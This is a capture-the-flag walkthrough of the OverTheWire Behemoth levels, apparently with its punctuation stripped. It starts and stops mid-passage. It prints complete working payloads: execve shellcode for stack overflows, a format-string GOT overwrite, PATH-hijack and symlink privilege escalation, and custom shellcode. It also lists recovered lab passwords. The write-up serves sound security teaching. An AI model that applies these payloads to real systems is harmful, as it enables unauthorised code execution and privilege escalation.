0x90909090      0x90909090      0x909090900xffffd60c      0x90909090      0x90909090      0x90909090      0x909090900xffffd61c      0x90909090      0x90909090      0x6850c031      0x68732f2f0xffffd62c      0x69622f68      0x50e3896e      0xb0e18953      0x0080cd0b0xffffd63c      0x08048480      0x080484e0      0xf7fe9070      0xffffd64c0xffffd64c      0xf7ffd920      0x00000001      0xffffd7a5      0x00000000           endhighlightThe value for the eip register can be found at 0xffffd5bc  It is then followed by a sequence of NOPs  The shellcode is most likely the one at 0xffffd61c   8  Thus  the return address will most likely work if given a value between 0xffffd5bc   4 and  0xffffd61c   8highlight bash behemoth1 behemoth    python  c  print  A  71   xd0xd5xffxff   x90  100  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80    behemoth behemoth1Password  Authentication failure Sorry Illegal instruction   endhighlightIt is imperative to note that upon piping this malicious payload into the binary  we did not receive a Segmentation Fault error  rather an Illegal Instruction error was printed out  This error is present whenever a program jumps to an address with code that cannot be interpreted either because it is plain data or is an ambiguous part of an opcode  that s why this error is also called an illegal opcode error   This is an indication that our payload most likely works  however the return address needs to be tweaked so as to point to an address in memory that will correctly interpret our shellcode  After tweaking with the address for a bit by slightly decrementing it  the following is foundhighlight bash behemoth1 behemoth    python  c  print  A  71   xbbxd5xffxff   x90  100  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80    behemoth behemoth1Password  Authentication failure Sorry    endhighlightNote how now there is no error displayedThe program is most likely executing the shellcode  but a shell was not received  This is most likely due to the stdin and stdout being tied to this process  By appending  cat   to the end of the command to output stdin  the exploit works as intendedhighlight bash behemoth1 behemoth     python  c  print  A  71   xbbxd5xffxff   x90  100  x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80   cat     behemoth behemoth1Password  Authentication failure Sorry whoamibehemoth2cat  etc behemoth pass behemoth2eimahquuof   endhighlightMethod 2Alternatively  it is possible to exploit this binary by using environment variableshighlight bash behemoth1 behemoth  tmp dfghoifdghfoidghiodfh  export EGG   python  c  print  x90x90x90x90x90x90x6ax31x58xcdx80x89xc3x89xc1x6ax46x58xcdx80x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex54x5bx50x53x89xe1x31xd2xb0x0bxcdx80    endhighlightWe can create a c file which will take our environment variable to use for the targeted binaryhighlight c  include  stdio h  include  stdlib h  include  string hint main int argc  char  argv            if argc   3                      printf  Usage   s  environment variable   target program name n   argv 0                              exit 0                                             char  ptr   getenv argv 1       get env var location                  ptr     strlen argv 0     strlen argv 2    2     adjust for program name                      printf   s will be at  pn   argv 1   ptrendhighlightAfter compiling the program with gcc  the program can be executed so as to inject the shellcode into the environment variable  and find where it is located in memoryhighlight bash behemoth1 behemoth  tmp dfghoifdghfoidghiodfh  gcc  m32 find addr c  o find addrbehemoth1 behemoth  tmp dfghoifdghfoidghiodfh    find addr EGG  behemoth behemoth1EGG will be at 0xffffddd3   endhighlightSeeing that the shellcode is at 0xffffddd3 the payload can be constructed to point to this addresshighlight bash behemoth1 behemoth  tmp dfghoifdghfoidghiodfh   python  c  print  A  71  xd3xddxffxff   cat     behemoth behemoth1Password  Authentication failure Sorry whoamibehemoth2   endhighlightBehemoth 2As the behemoth2 user  the behemoth2 binary can now be executedBinary Analysis BehaviorAfter executing the binary  the program simply touches a file and then hangshighlight bash behemoth2 behemoth  behemoth    behemoth2touch  cannot touch  30233   Permission denied   endhighlightSeeing as this binary performs a system function  there is most likely a system function being called within the program GhidraAfter downloading the binary onto the attack box  this binary can be further analyzed within Ghidrahighlight c undefined4 main voiduint uVar1    uid t  Var2    uid t  Var3  stat local 90  undefined4 local 2c  undefined local 28  char acStack38  14   char  local 18    pid t local 14  undefined  local 10   local 10    stack0x00000004  local 14   getpid    local 18   acStack38  sprintf  char    local 2c  touch  d  local 14   uVar1   lstat local 18  local 90   if   uVar1   0xf000     0x8000      unlink local 18      Var2   geteuid       Var3   geteuid      setreuid  Var3  Var2     system  char    local 2c     sleep 2000   local 2c   0x20746163  local 28   0x20   Var2   geteuid     Var3   geteuid    setreuid  Var3  Var2   system  char    local 2c   return 0endhighlightToward the top of the program  the sprintf function is called in which the string  touch  d  is passed into the local 2c variable  with  d corresponding to the id of this process   It is essential to note that touch is declared without using its full path  i e   usr bin touchFurthermore  two system calls are executed  One is within the if statement and one is outside the if statement following a sleep of 2000 seconds  This sleep call is responsible for the hanging that was experienced after executing the binary  Therefore  the first system call is to the touch command  The second system call again uses the local 2c variable  but only after it is initialized to 0x20746163  Converting 20 74 61 63 into ascii results in   tachighlight bash behemoth2 behemoth  behemoth  file behemoth2behemoth2  setuid ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  for GNU Linux 2 6 32  BuildID sha1  87daf01f3941b5f8f815d758ed9e90589a9d315c  not stripped   endhighlightSeeing as this binary is in LSB format  the   tac  string should actually be read backwards  revealing that this is  cat    Thus  the program first touches the a file then cats it after 2000 secondsBinary ExploitationThis binary has multiple vulnerabilities  and each method of exploitation is described below Path Privesc  Touch Seeing as this binary executes the touch command without using its full path  a file called touch can be created which executes the  bin bash commandhighlight bash behemoth2 behemoth  tmp pathprivesc  echo   bin bash    touchbehemoth2 behemoth  tmp pathprivesc  chmod 777 touch   endhighlightAfter creating this file with the aforementioned contents  the PATH environment variable can be updated to prioritize the current directory over all other directorieshighlight bash behemoth2 behemoth  tmp pathprivesc  export PATH    PATHbehemoth2 behemoth  tmp pathprivesc  which touch  touch   endhighlightNow  upon executing the behemoth2 binary  the touch command will be called to the newly created touch filehighlight bash behemoth2 behemoth  tmp pathprivesc   behemoth behemoth2behemoth3 behemoth  tmp pathprivesc  whoamibehemoth3   endhighlight Path Privesc  Cat The same methodology used for the touch command can be used for the cat command  As seen from the analysis  the cat command is also being called without using its full pathhighlight bash behemoth2 behemoth  tmp pathprivesc  echo   bin bash    catbehemoth2 behemoth  tmp pathprivesc  chmod 777 catbehemoth2 behemoth  tmp pathprivesc  export PATH    PATHbehemoth2 behemoth  tmp pathprivesc   behemoth behemoth2touch  cannot touch  29678   Permission deniedbehemoth3 behemoth  tmp pathprivesc  whoamibehemoth3   endhighlightThis way of escalating privileges takes longer than the aforementioned one because a wait of 2000 seconds is necessary before cat gets executed Symbolic LinkThis binary could still be abused even if the cat and touch commands were executed using their full paths  A symbolic link to the behemoth3 password file can be created so that the cat command reads the password of the behemoth3 user  The name of the file must correspond to the id of the process  When the cat command reads the contents of the created file  it will be pointed to the credentials of behemoth3  and the password of the user would be printed to stdoutbehemoth2 behemoth  tmp behemoth2   behemoth behemoth2touch  cannot touch  10216   Permission deniedOnce the behemoth2 binary was executed  an error occurred stating that the file 10216 was attempted to be created  but the behemoth3 user does not have the permissions to create this file under a directory owned by behemoth2  The name of the file is leaked  meaning that a symbolic link named after this file can be created before the cat command gets executed  the time limit for creating this file is 2000 secondsAfter logging into another session as the behemoth2 user  a symbolic link corresponding to 10216 can be createdhighlight bash behemoth2 behemoth  tmp behemoth2  ln  s  etc behemoth pass behemoth3 10216behemoth2 behemoth  tmp behemoth2  ls  la 10216 lrwxrwxrwx 1 behemoth2 root 28 May 15 06 53 10216     etc behemoth pass behemoth3   endhighlightNote that this file is pointing to the password of the behemoth3 userAfter waiting for 2000 seconds  the password of the behemoth3 user gets printed outhighlight bash behemoth2 behemoth  tmp behemoth2   behemoth behemoth2touch  cannot touch  10216   Permission deniednieteidiel   endhighlightBehemoth 3After successfully abusing the behemoth2 binary  the next challenge is behemoth3Binary AnalysisWe can begin the analysis by downloading the target binary on the attack box and running the checksec command against ithighlight bash    0xd4y Writeup     business other overthewire behemoth 3       checksec behemoth3      home 0xd4y business other overthewire behemoth 3 behemoth3    Arch      i386 32 little   RELRO     No RELRO   Stack     No canary found   NX        NX disabled   PIE       No PIE  0x8048000    RWX       Has RWX segments   0xd4y Writeup     business other overthewire behemoth 3       file behemoth3behemoth3  ELF 32 bit LSB executable  Intel 80386  version 1  SYSV   dynamically linked  interpreter  lib ld linux so 2  for GNU Linux 2 6 32  BuildID sha1  4c39bd8f6f54ab267675a6c5e2186d65e1eb4821  not stripped   endhighlightFrom the results of checksec and file  note that the binary essentially has no protection on it  Everything that could possibly hinder debug analysis on the program is disabled  Additionally  the file is not stripped  so debug symbols will be available BehaviorWhen executing the program  we are asked to provide an identification    highlight bash behemoth3 behemoth  behemoth    behemoth3Identify yourself  This is a testWelcome  This is a testaaaand goodbye again    endhighlightAfter inputting a large amount of A s  in this example 500 A s were used   the program prints out a minimized version of the stringhighlight bash behemoth3 behemoth  behemoth    behemoth3Identify yourselfelcome  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAaaaand goodbye again    endhighlightDespite 500 A s being passed into the buffer  only 200 A s were printed out  Ghidra can be implemented to further help in understanding how this binary is working GhidraGhidra translated the assembly code of the main function into the followinghighlight c undefined4 main void   char local cc  200    printf  Identify yourself      fgets local cc 200 stdin   printf  Welcome      printf local cc   puts  naaaand goodbye again     return 0endhighlightA variable called local cc of type char is declared and is allocated 200 bytes  Afterwards  the fgets function is used to allow up to 200 bytes to be passed to the local cc variable  and therefore this binary is not vulnerable to a buffer overflow exploit  However  the user input  local cc  is passed directly to the printf function without any sort of sanitization  Consequently  the program is likely vulnerable to a string format exploit  3    ftnt3Discovery of Format String VulnerabilityThis can be verified by passing a format string into the local cc variablehighlight bash behemoth3 behemoth  behemoth    behemoth3Identify yourself   xWelcome  a7825aaaand goodbye again    endhighlightDespite inputting  x into the buffer  an output of a7825 was printed  note that  x is a format string to specify an unsigned int as a hexadecimal number  4    ftnt4    When the binary is given a format string as an input  it starts to leak memory from the stackThis vulnerability can be abused to overwrite memory by using the  n format string which writes the number of characters written into a pointer parameter  If the pointer parameter is an address that the binary uses  then the memory address of the function can be overwritten to point to shellcode  This can result in the execution of arbitrary code Memory Addresses of Useful FunctionsThe objdump command can be utilized to determine the addresses of functions used by the binaryhighlight bash behemoth3 behemoth  behemoth  objdump  R   behemoth3behemoth3      file format elf32 i386DYNAMIC RELOCATION RECORDSOFFSET   TYPE              VALUE08049794 R 386 GLOB DAT      gmon start  080497c0 R 386 COPY        stdin  GLIBC 2 0080497a4 R 386 JUMP SLOT   printf GLIBC 2 0080497a8 R 386 JUMP SLOT   fgets GLIBC 2 0080497ac R 386 JUMP SLOT   puts GLIBC 2 0080497b0 R 386 JUMP SLOT     libc start main GLIBC 2    endhighlightFrom the output  there are a total of three functions displayed  printf  fgets  and puts   However  the fgets and printf functions should not be overwritten  as these functions must work properly to accept the malicious payload  This leaves the puts function as the only candidate from the objdump output to be overwritten Overwriting PutsBefore being able to overwrite the memory address of puts  the user input s location within the stack must first be determinedhighlight bash behemoth3 behemoth  behemoth    behemoth3Identify yourself  AAAA xWelcome  AAAA41414141aaaand goodbye again    endhighlightWhen inputting AAAA followed by a  x format string  the hexadecimal values of the A s are immediately printed  This means that the user input is in the first parameter within the stack  Throughout this level  the malicious input will be directed to a file so that the payload can be constructed with the help of GDB  Constructing Payload With GDBUsing the address of puts found by the objdump command  the following payload can be constructedhighlight bash behemoth3 behemoth  tmp overwrite puts  python  c  print  xacx97x04x08    100x n     overwrite   endhighlightThe xacx97x04x08 string corresponds to the address of the puts function in little endian form  0x080497ac   Following this  the hex output of this string is printed out with a padding of 100 0 s  This type of padding is extremely useful for controlling the value of the memory address of whatever is being overwrittenWhen this payload is inputted into the binary within GDB  a segmentation fault occurs  however the address of the puts function does not follow an expected valuehighlight bash  gdb  r   overwrite                        Starting program   behemoth behemoth3   overwrite                                                                                                                                                                           Program received signal SIGSEGV  Segmentation fault xf7e55137 in vfprintf    from  lib32 libc so 6      gdb  x x x080497ac                        x80497ac       x08048356   endhighlightObserve that the address is x08048356 instead of a low value  To be exact  the value should be equal to the number of characters that are in the payload  This would mean that the value should be 4  for the address of puts    100  hex formatter  which is 104 in decimal and 0x68 in hex  Prepending AAAA to the beginning of the payload successfully overwrites the puts functionhighlight bash behemoth3 behemoth  tmp overwrite puts  python  c  print  AAAAxacx97x04x08      100x n     overwritegdb  r   overwriteThe program being debugged has been started already Start it from the beginning   y or n  yStarting program   behemoth behemoth3   overwriteIdentify yourself  Welcome  AAA                                                                                            41414141Program received signal SIGSEGV  Segmentation fault 0x0000006c ingdb  x x 0x080497ac0x80497ac       0x0000006cNote that the puts function points to 0x6c which is 108 in decimal  this change from 104 is a result of prepending 4 A s    endhighlightExploit DevelopmentWith the successful overwrite of the puts function  the next step is to control the address that it points to  Currently  it points to 0x6c  but this value must be changed to point to shellcode in order for the successful execution of arbitrary code  The particular methodology used to develop this exploit will work on the basis of overwriting the puts function address two bytes at a time   Thus  the final exploit will look like the followinghighlight bash  AAAA     xacx97x04x08     AAAA     xaex97x04x08    NOP SLED   SHELLCODE   FORMAT STRINGS TO CONTROL PUTS ADDRESS   endhighlightNote that there are two addresses within this payload  one is the base address of the puts function  and the other is the puts address   2 to accommodate for overwriting the address two bytes at a time  This will also mean that two  x strings must be used along with two  n s  Additionally  a shellcode  5    ftnt5  of 23 bytes will be used Controlling Puts AddressTo begin the exploit  the puts address must first be controlled with the help of format string paddinghighlight bash behemoth3 behemoth  tmp overwrite puts  python  c  print  AAAA     xacx97x04x08     AAAA     xaex97x04x08     x90  100    S  23     100x n     exploit   endhighlightA NOP sled of 100 bytes is used before the shellcode of 23 bytes  denoted by the placeholder  S   is declared  Following the shellcode is a padding of 100 bytes to the hex format specifier which results in the puts address of 0xef when executedhighlight bash  gdb  r   exploitStarting program   behemoth behemoth3   exploitIdentify yourself  Welcome  AAAAAASSSSSSSSSSSSSSSSSSSSSSS                                                                                            41414141Program received signal SIGSEGV  Segmentation fault x000000ef in       endhighlightA segmentation fault occurred as expected  because the puts address points to a memory address that it cannot access  Ideally  the puts function should point to an address somewhere within the nop sled  Seeing as the nop sled consists of 100 bytes  there are multiple addresses that would work for this exploithighlight bash  gdb  x 40x  esp0xffffd4d8      0x080484d1      0x0804857e      0x41414141      0x080497ac0xffffd4e8      0x41414141      0x080497ae      0x90909090      0x909090900xffffd4f8      0x90909090      0x90909090      0x90909090      0x909090900xffffd508      0x90909090      0x90909090      0x90909090      0x909090900xffffd518      0x90909090      0x90909090      0x90909090      0x909090900xffffd528      0x90909090      0x90909090      0x90909090      0x909090900xffffd538      0x90909090      0x90909090      0x90909090      0x909090900xffffd548      0x90909090      0x90909090      0x90909090      0x535353530xffffd558      0x53535353      0x53535353      0x53535353      0x535353530xffffd568      0x25535353      0x78303031      0x000a6e25      0x00000000   endhighlightThe exploit begins at address 0xffffd4d8   8  as can be seen from 0x41414141 which is AAAA  followed by the address of puts and another string of four A s  This is then followed by puts   2  and finally the nop sled begins at 0xffffd4e8   8  For the purposes of this exploit  a memory address of 0xffffd518 was chosen  Note how this value in decimal is 4294956312 which theoretically could be obtained by passing in an exploit that is about 4294956312 bytes long  In reality  however  this would cause a memory overload  and even if it didn t  printing this many bytes to stdout would take a long time    As mentioned in  Exploit Development   h jagnc9qowxus   this can be bypassed by passing two  n format specifiers which point to two different points in memory whose addresses are two bytes apartThe largest value for each part of the memory address when split into two is 16 4   1 which is 65535  This largely reduces the 4294956312 length previously mentioned  Incidentally  the largest value possible for a 32 bit binary is 16 8   1 which is 4294967295 or 0xffffffffA value of 0xef was written to the puts function address  however  a value of 0xd510  for the lower two bytes  was desired  The padding necessary for achieving this value can be determined through the following calculationdesired output   current output   current paddinghighlight bash  gdb  p 0xd510   0xef   100 3   54405   endhighlightThus  a padding of 54405 is needed to output 0xd510highlight bash  gdb  r   exploit                                                                                                                                                                            Starting program   behemoth behemoth3   exploit                                                                          Identify yourself  Welcome  AAAAAASSSSSSSSSSSSSSSSSSSSSSSProgram received signal SIGSEGV  Segmentation fault x0000d510 in       endhighlightThe lower two bytes were successfully overwritten to 0xd510  The same method can be used to overwrite the two most significant byteshighlight bash behemoth3 behemoth  tmp overwrite puts  python  c  print  AAAA     xacx97x04x08     AAAA     xaex97x04x08     x90  100    S  23     54405x n 100x n     exploit   endhighlightNote that a padding of 100 was arbitrarily picked so as to perform the following calculationsAfter inputting a padding of 100 bytes for the two most significant bytes  the subsequent value was determined to be 0xd574highlight bash  gdb  r   exploit                              Starting program   behemoth behemoth3   exploit              Identify yourself  Welcome  AAAAAASSSSSSSSSSSSSSSSSSSSSSSProgram received signal SIGSEGV  Segmentation fault xd574d510 in       endhighlightThe correct padding can subsequently be calculatedhighlight bash  gdb  p 0xffff   0xd574   100 2   10991   endhighlightTherefore  the final exploit will look like the followinghighlight bash python  c  print  AAAA     xacx97x04x08     AAAA     xaex97x04x08     x90  100    x31xc0x50x68x2fx2fx73x68x68x2fx62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80      54405x n 10991x n   endhighlight Popping a ShellNote that the S was also changed to the actual shellcode  Executing this payload within GDB causes the debug process to abruptly exit due to the execution of  bin dashhighlight bash  gdb  r   exploit                                                                                                                                                  Starting program   behemoth behemoth3   exploit                                      Identify yourself  Welcome  AAAAAA1Ph  shh binPS                                         41414141process 14128 is executing new program   bin dash Inferior 1  process 14128  exited normally    endhighlightWhen this payload is piped straight into the binary without GDB  a shell is returnedhighlight bash behemoth3 behemoth  tmp overwrite puts   python  c  print  AAAA     xacx97x04x08                                                                                            AAAA     xaex97x04x08     x90  100    x31xc0x50x68x2fx2fx73x68x68x2f                                                                                      x62x69x6ex89xe3x50x53x89xe1xb0x0bxcdx80      54405x n 10991x n   cat                                                                                             behemoth behemoth3                                                                                                                                                          Identify yourself  Welcome  AAAAAA1Ph  shh binPS                                     41414141   whoami   behemoth4   cat  etc behemoth pass behemoth4   ietheishei    endhighlight   Note that cat    is appended to the end of the payload  This is an essential part of the exploit which allows the process to interact between stdin and stdout  Without cat  the process immediately exits without errorsIncidentally  when first performing the exploit of this binary  a  bin bash shellcode  6    ftnt6  was used  however it did not work outside GDB for unknown reasons  When a binary exploitation does not work as intended  it could be beneficial to use a different shellcode to see if it resolves the problemBehemoth 4With the necessary permissions obtained by compromising the behemoth4 user  the behemoth4 binary can be executedBinary AnalysisBefore being able to exploit the binary  it is necessary to understand how it works first BehaviorExecuting the binary does not result in anything out of the ordinaryhighlight bash behemoth4 behemoth  tmp   behemoth behemoth4PID not found    endhighlightThe program simply prints out  PID not found   and exits immediately GhidraWithin Ghidra  we can get a further look at how the program is getting the PID  and what it does with ithighlight c undefined4 main voidchar local 30  20   int local 1c  FILE  local 18    pid t local 14  undefined  local c   local c    stack0x00000004  local 14   getpid    sprintf local 30   tmp  d  local 14   local 18   fopen local 30  r    if  local 18     FILE   0x0      puts  PID not found       else     sleep 1     puts  Finished sleeping  fgetcing      while  true         local 1c   fgetc local 18       if  local 1c     1  break       putchar local 1c         fclose local 18     return 0endhighlightThe program starts by declaring a couple of variables  The getpid function is called  and local 14 is set to equal its output  This output is then concatenated with  tmp  and local 30 is set to equal it  Afterwards  the local 18 variable is set to equal the output when opening a file in  tmp whose name corresponds to the id of the binary s process  which is local 30   If the file does not exist  then  PID not found   is printed out  Otherwise  the contents of the file is read out by using the getchar function within a while loopBinary ExploitationThe problem with this program is that it assumes that it can only read files within the  tmp directory  However  symbolic links can be used to make the program read the password file of the behemoth5 user Symbolic Link AttackSeeing as the pid of the binary cannot be easily determined before executing the program  a bash script can be utilized to create many files that correspond to possible PIDs  Before creating this bash script  the approximate PID of the binary must first be foundhighlight bash behemoth4 behemoth  tmp  ltrace  behemoth behemoth4  libc start main 0x804857b  1  0xffffd674  0x8048640  unfinished     getpid                                                                       22928sprintf   tmp 22928     tmp  d   22928                                       10fopen   tmp 22928    r                                                       0puts  PID not found  PID not found                                                         15    exited  status 0      endhighlightThis process was assigned to the ID of 22928  and it therefore looked for a file called 22928 within the  tmp directory  The PID upon the next execution of the binary must be greater than 22928 but likely less than 30000highlight bash behemoth4 behemoth  tmp  for i in  22928  30000   do ln  s  etc behemoth pass behemoth5  i done   endhighlightNow  when the binary is executed  it will read the contents of behemoth5 s passwordhighlight bash behemoth4 behemoth  tmp   behemoth behemoth4                                                                              Finished sleeping  fgetcing                                                                                              aizeeshing                                                                                                                 endhighlightBehemoth 5By first logging into the account through ssh with the credentials found in  Behemoth 4   h eoybw49l4xbw   the behemoth5 binary can be executedBinary AnalysisWhen executing the binary  nothing out of the ordinary occurs  The binary simply exits without anything printing out to stdout  After downloading the binary onto the attack box  Ghidra could be utilized to help in analyzing the binary Ghidrahighlight c void main voidlong lVar1  size t sVar2  int iVar3  undefined local 38  4   undefined4 local 34  undefined auStack48  8   ssize t local 28  int local 24  hostent  local 20  char  local 1c  FILE  local 18  size t local 14  undefined  puStack12puStack12    stack0x00000004  local 14   0  local 18   fopen   etc behemoth pass behemoth6   r    if  local 18     FILE   0x0      perror  fopen                         WARNING  Subroutine does not return      exit 1fseek local 18 0 2   lVar1   ftell local 18   local 14   lVar1   1  rewind local 18   local 1c    char   malloc local 14   fgets local 1c local 14 local 18   sVar2   strlen local 1c   local 1c sVar2     0   fclose local 18   local 20   gethostbyname  localhost    if  local 20     hostent   0x0      perror  gethostbyname                         WARNING  Subroutine does not return      exit 1local 24   socket 2 2 0   if  local 24     1      perror  socket                         WARNING  Subroutine does not return      exit 1local 38  0 2    2  iVar3   atoi  1337    local 38  2 2    htons  uint16 t iVar3   local 34     undefined4    local 20  h addr list  memset auStack48 0 8   sVar2   strlen local 1c   local 28   sendto local 24 local 1c sVar2 0  sockaddr   local 38 0x10   if  local 28     1      perror  sendto                         WARNING  Subroutine does not return      exit 1close local 24                        WARNING  Subroutine does not return    exit 0endhighlightAfter many different variables are declared  the password for the behemoth6 user is read into the program  Afterwards  the gethostbyaddressname function is called with the argument  localhost   Shortly afterwards  the socket function is called using the arguments  2 2 0   Observe the following code and the corresponding Ghidra outputSource1 reports Behemoth image12 png Ghidra1 reports Behemoth image4 png Source2 reports Behemoth image7 png Ghidra2 reports Behemoth image1 png Source3   reports Behemoth image3 png         Ghidra3 reports Behemoth image11 png The socket arguments of Ghidra3 are identical to the arguments seen from behemoth5  Therefore  the arguments seen in the behemoth5 binary correspond to iPv4  UDP  and default protocol respectively  7    ftnt7Following the calling of the socket function  iVar3 is set to be 1337 before a sendto function is called  From these lines of code  it can be discerned that a UDP socket is opened on port 1337  and the password of the behemoth6 user is sent to itCatching Behemoth6 Password Through UDPBefore executing the binary  it is essential that another session be opened so that a UDP listener can be set up on port 1337behemoth5 behemoth    nc  lup 1337 localhostThe  u flag specifies UDP mode   p is for specifying a port  and  l tells nc to listen for inbound connectionsAfter executing the binary  the password of the behemoth6 user can be seen on stdout reports Behemoth image10 png Note that the blue line is a result of using tmux  8    ftnt8   and it represents the delimiter between different sessionsThis challenge was more of a reverse engineering exercise  but it is good practice for developing the skill of understanding the functionality of a binaryBehemoth 6After logging in as the behemoth6 user and executing the behemoth6 binary  the following output is seenbehemoth6 behemoth  behemoth    behemoth6Incorrect outputFurthermore  performing the ls command on the  behemoth directory reveals another interesting file possibly related to behemoth6highlight bash behemoth6 behemoth  behemoth  lsbehemoth0  behemoth1  behemoth2  behemoth3  behemoth4  behemoth5  behemoth6  behemoth6 reader  behemoth7   endhighlightNamely  that file is called behmoth6 reader and it might be used by the behemoth6 binary  After downloading the binary onto the attack box  the binary can be analyzed with the help of GhidraGhidraGhidra translated the assembly code found for each binary into the following reports Behemoth image9 png The code on the left was produced by the behemoth6 binary  while the code on the right is from the behemoth reader  Looking at the code for the bhemeoth6 reader program  a file named shellcode txt is expected  However  the contents of this file are not printed out anywhere  If a file named shellcode txt exists  then a small sanitization is performed against the file  if the 0xb byte exists within the file  then the program immediately exitsIn short  the program is executing the contents of the shellcode txt file as machine code  Therefore  shellcode will get executed by the binary  This  however  will not directly result in a privileged shell due to the fact that the SETUID bit is not enabled on the behemoth6 reader binary  Rather  the behemoth6 binary has the SETUID bit  and its interaction with the behemoth6 reader will determine the significance of the shellcodeLooking at the code for behemoth6  observe that the file is opened using the popen function in read mode  after which the output is passed into the   stream variable  This variable then gets passed into   s1 which is compared against the string  HelloKitty  in the strcmp function  If the contents of this variable matches the string  then a  bin sh shell is returnedAbusing popen  The output of the popen function is determined by the behemoth6 reader  Consequently  if the behemoth6 reader executes shellcode that makes it print out  HelloKitty   then a shell will be returned  There are already shellcodes online that perform this operation  and the following shellcode was used  9    ftnt9highlight c char code        xe9x1ex00x00x00               jmp     relative   MESSAGE     xb8x04x00x00x00               mov     0x4  eax    xbbx01x00x00x00               mov     0x1  ebx    x59                               pop     ecx    xbax0fx00x00x00               mov     0xf  edx    xcdx80                           int     0x80    xb8x01x00x00x00               mov     0x1  eax    xbbx00x00x00x00               mov     0x0  ebx    xcdx80                           int     0x80    xe8xddxffxffxff               call    relative   GOBACK    endhighlightThe code above prints out whatever string follows it  however the string must be in machine code   This code  coupled with a subsequent string in shellcode will result in a successful string comparison  To facilitate the conversion between ascii and shellcode  a conversion table  10    ftnt10  was usedAsciiHelloKittyShellcodex48x65x6cx6cx6fx4bx69x74x74x79After creating a directory in  tmp  so as to be able to create files   the following code was printed into shellcode txthighlight bash behemoth6 behemoth  tmp behemoth6   python  c  print  xe9x1ex00x00x00xb8x04x00x00x00xbbx01x00x00x00x59xbax0fx00x00x00xcdx80xb8x01x00x00x00xbbx00x00x00x00xcdx80xe8xddxffxffxff    x48x65x6cx6cx6fx4bx69x74x74x79     shellcode txt   endhighlightNow when executing the behemoth6 binary  the shellcode file will be called when the behemoth6 reader is executed via the popen function  subsequently making the reader print out HelloKitty  This will cause the strcmp function to run true  and a  bin sh shell is subsequently returnedhighlight bash behemoth6 behemoth  tmp behemoth6   behemoth behemoth6Correct   whoamibehemoth7  cat  etc behemoth pass behemoth7baquoxuafo   endhighlightBehemoth 7After successfully exploiting the behemoth6 binary  we are left with the final challenge of exploiting the behemoth7 binaryBinary AnalysisBefore analysing the binary within tools such as GDB and Ghidra  it is advised to first start by executing the binary to observe its behavior BehaviorUpon executing the binary  nothing conspicuous occurs  The binary immediately exits after execution without printing anything to stdout GhidraAfter downloading the binary onto the attack box  the binary can be analyzed with the help of Ghidra  Using Ghidra  the assembly code of the binary was converted to the following codehighlight c undefined4 main int param 1 int param 2 int param 3   size t   n  ushort   ppuVar1  char local 210  512   int local 10  int local c  char  local 8local 8     char     param 2   4   local c   0  while    int    param 3   local c   4     0        n   strlen   char     param 3   local c   4      memset   void     param 3   local c   4  0   n     local c   local c   1local 10   0  if  1   param 1      while    local 8     0      local 10   0x200          local 10   local 10   1      ppuVar1     ctype b loc        if      ppuVar1   local 8    0x400     0             ppuVar1     ctype b loc       ppuVar1   local 8    0x800     0           fprintf stderr  Non  s chars found in string  possible shellcode n   alpha                         WARNING  Subroutine does not return          exit 1 local 8   local 8   1      strcpy local 210   char     param 2   4         return 0   endhighlightAt the very top of the code  it can be seen that the main function takes three parameters  These parameters most likely correspond to the input given by argc  11    ftnt11   At the top of the main function are declarations of variables  and among them is local 210 with 512 bytes allocated to it  Toward the middle of the main function is a while loop located within an if statement  Inside of the while loop is an if statement which  upon running true  prints the followinghighlight c fprintf stderr  Non  s chars found in string  possible shellcode n   alpha     endhighlightTherefore  it is likely there is a filter on non alphanumeric characters  12    ftnt12   This could limit the possible shellcode that could be used if the EIP register cannot be overwritten  However  looking at the code  there does not seem to be any boundary checks  and the EIP register should capable of being overwritten  This can be verified by inputting a large number of bytes into the programhighlight bash behemoth7 behemoth  behemoth  gdb  q  behemoth behemoth7Reading symbols from  behemoth behemoth7    no debugging symbols found    done  gdb  r   python  c  print  A  1000  Starting program   behemoth behemoth7   python  c  print  A  1000Program received signal SIGSEGV  Segmentation fault 0x41414141 in       endhighlightThe EIP register was successfully overwritten as can be seen by the value of the instruction pointer  0x41414141   which is AAAA in hex  Therefore  the shellcode that will be used for exploiting this binary does not have to be made of alphanumeric charactersConstructing PayloadThe payload will consist of the necessary amount of bytes to equal the EIP offset  followed by the address of the shellcode  after which the NOP sled will be declared which precedes the shellcode Calculating EIP OffsetTo begin the construction of the exploit  the EIP offset must first be calculatedhighlight bash pwndbg  r   cyclic 1000                                                                                                                                             Starting program   home 0xd4y business other overthewire behemoth 7 behemoth7   cyclic 1000Program received signal SIGSEGV  Segmentation fault 0x66616168 in                              LEGEND  STACK   HEAP   CODE   DATA   RWX   RODATA                                      REGISTERS                                       EAX  0x0                                 EBX  0x0                                 ECX  0xffffd290      yaaj                  EDX  0xffffcde0      yaaj                  EDI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   ESI  0xf7fa6000   GLOBAL OFFSET TABLE       insb   byte ptr es  edi   dx    0x1e4d6c   EBP  0x66616167   gaaf                                                                                                                                                      ESP  0xffffcc10     0x66616169   iaaf                                                                                                                                        EIP  0x66616168   haaf                                                                                                                                                                                              DISASM                                                                                                                              Invalid address 0x66616168                 pwndbg  cyclic  l 0x66616168528   endhighlightThe offset was calculated as 528 bytes  and as such 528 bytes of junk must first be inputted into the binary before the EIP register can be controlled Shellcode AddressThe next step is to determine the address of the shellcode  13    ftnt13   This can easily be analyzed within GDBhighlight bash  gdb  r   python  c  print  A  528  BBBB   A  112  x6ax0bx58x99x52x66x68x2dx70x89xe1x52x6ax68x68x2fx62x61x73x68x2fx62x69x6ex89xe3x52x51x53x89xe1xcdx80Starting program   behemoth behemoth7   python  c  print  A  528  BBBB   A  112  